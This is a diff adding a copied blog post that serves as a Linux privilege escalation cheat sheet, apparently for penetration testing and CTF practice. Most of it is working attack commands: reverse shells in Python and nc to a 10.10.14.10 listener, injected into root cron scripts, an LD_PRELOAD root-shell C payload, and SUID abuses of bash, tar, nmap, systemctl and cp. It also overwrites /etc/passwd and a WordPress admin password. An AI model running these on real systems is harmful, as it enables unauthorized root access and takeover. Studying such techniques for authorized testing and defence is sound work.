@@ -4,11 +4,194 @@
 ##
 ##
 
+##
+#
+https://johnjhacking.com/blog/linux-privilege-escalation-quick-and-dirty/
+#
+##
+
 yoyo ; cp $(which bash) /dev/shm; chmod +s /dev/shm/bash; /dev/shm/bash -p
+
 
 
 # Linux Privilege Escalation
 
+
+
+Linux Privilege Escalation: Quick and Dirty
+A quick and dirty Linux Privilege Escalation cheat sheet. I have utilized all of these privilege escalation techniques at least once.
+
+Published on Aug 10, 2020
+
+Reading time: 4 minutes.
+
+Linux Privilege Escalation: Quick and Dirty
+Automated Tooling
+Usually, my approach is to use an automated tool in conjunction with some manual enumeration. However, you can completely accomplish the Privilege Escalation process from an automated tool paired with the right exploitation methodology.
+
+1. Linpeas.sh (my go-to, fully automated)
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+2. Linprivchecker.py (my backup)
+https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
+3. Linux-Exploit-Suggest-2.pl (To look for those sneaky little Kernel Exploits)
+https://github.com/jondonas/linux-exploit-suggester-2
+
+Resources
+Keep in mind, that these are just some of the techniques I have used. You’ll find that some of the existing Linux Privilege escalation guides are much more comprehensive:
+
+1. The Holy Grail
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+2. My Second Favorite Guide
+https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_inux.html__
+3. GTFOBins (The most comprehensive binary privesc guide)
+https://gtfobins.github.io/
+
+Techniques
+God Mode
+
+history
+I know, seems crazy, the history command? Why? Well, I’ve successfully performed privilege escalation from finding hints or credentials in the user’s history.
+
+Capabilities
+If there’s a capability that has a setuid+ep, the command might be able to be abused
+Example:
+/usr/bin/python2.6 = capsetuid+ep
+
+For instance, I used this cheat sheet for capability exploits
+ref: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+
+Changing WordPress Password via MySQL DB I came across a situation in which taking over the WordPress website was essentially in the privilege escalation process due to versioning.
+
+Find MySQL credentials
+Connect to the Localhost Database
+mysql -h localhost -u user -p
+Authenticate using the credentials you found
+Select the database that has the credentials table
+USE databasename;
+Change the admin password or user’s password that you have access to
+UPDATE wp_users SET user_pass=PASSWORD('P@ssw0rd123!') WHERE user_login='wpadmin';
+KEY: wp_users is the table, SET is for the user password field in the table, and where is for the user login field within the table.
+Permissive Root Script If a cron job is running a script as root, determine what the script is doing. If you have full permission to edit the script, you’re golden. Note: the » in the one-liner echo represents overwriting the file.
+
+Two of my favorite examples:
+
+Python One-Liner
+
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> test.py
+Bash One-Liner (If the script is a .sh)
+
+echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.10 7242 > /tmp/f" >> monitor.sh
+Now set up a listener on the defined port, and wait for the script to run.
+
+LD_Preload In some circumstances, you may be able to abuse certain services that run via LD_Preload.
+
+Run:
+sudo -l
+If env_keep+=LD+PRELOAD is seen:
+Make a C script named “shell” or whatever you want
+nano shell.c
+Place the following code in the script:
+
+```
+\#include <stdio.h>
+   
+\#include <sys/types.h>
+   
+\#include <stdlib.h>
+   
+void _init() {
+   
+unsetenv("LD_PRELOAD");
+   
+setgid(0);
+   
+setuid(0);
+   
+system("/bin/bash");
+   
+}
+```
+Compile the shell
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+Take a look at what system services are being preloaded, for instance, if you see apache2 then you would do a sudo preload for apache2, escalating your current shell to a root level shell
+sudo LD_PRELOAD=/home/user/shell.so apache2
+Bash SUID This one absolutely blew my mind, I used it recently. If you find a private SSH Key, and you can log in with it: Check for a Bash SUID. If you have it, you might be able to escalate during authentication!
+
+ssh -i id_rsa user@ip bash -p
+Lua Privilege Escalation This is another one of those strange one-off scenarios. I had a script that allowed me to drop into a little command prompt and run different commands as root (but most of them would just print the word “nil”). I had no idea what was happening. After a little research, I found out that nil was Lua’s version of null (basically the error was telling me that it was attempting to use Lua commands but the commands used did not exist) and the prompt I was using was some sort of Lua Script. Jokingly, I typed the following:
+
+os.execute('/bin/sh')
+I was root!!
+
+Sudo Bypass
+
+I noticed the following entry [(ALL, !root) /bin/bash)] upon running:
+
+sudo -l 
+I had root permissions to run bash, an obvious win! Attempting to run it as the root user would not work. A quick google search helped me understand that it was a Sudo Privilege Escalation bypass:
+
+sudo -u#-1 /bin/bash
+Tar SUID
+If you find a Tar SUID assigned to your current user, it’s an easy win:
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+TMUX Session Running as Root
+I cannot express how many times this one has been overlooked. I’ve legitimately exploited 5+ systems in CTF-Like environments with this gem. If you see a TMUX session running as root, look at the path. Typically, I’ve seen the session running under /.devs/dev_sess
+
+This can be identified using:
+
+ps -aux | grep tmux
+If you see that, and a session is active as the root user, attempt an easy win:
+
+tmux -S /.devs/dev_sess
+If it works, check your privs! You might just be root.
+
+NMAP SUID
+Yes, another exceedingly simple win:
+
+nmap --interactive
+!sh
+Systemctl SUID
+Identifying this beauty represents yet another win
+
+Run each one of these commands in order:
+
+TF=$(mktemp).service
+
+echo '[Service]
+
+Type=oneshot
+
+ExecStart=/bin/sh -c "id > /tmp/output"
+
+[Install]
+
+WantedBy=multi-user.target' > $TF
+
+systemctl link $TF
+
+systemctl enable --now $TF
+Copy SUID
+
+Noticing the ‘cp’ command with SUID assigned to your user account could allow you to overwrite the passwd file of the victim system, giving yourself root permissions:
+
+Open up a terminal in your attacking machine, create a salted password:
+openssl passwd -1 -salt roflroot pass123
+Copy your attacking machine local passwd file to have something to edit:
+cp /etc/passwd /root/Exploits
+Host HTTP Server:
+python -m SimpleHTTPServer 8000
+Navigate to /tmp directory on the victim host machine or somewhere you have write permissions and download the passwd file:
+wget http://192.168.119.221:8000/passwd
+Copy passwd file to /etc/passwd:
+cp passwd /etc/passwd
+Switch to your created user:
+su roflroot
+I hope some of these techniques help you! If you liked my guide, be sure to follow me on Twitter: @johnjhacking
+
+##
+##
 <details>
 
 <summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
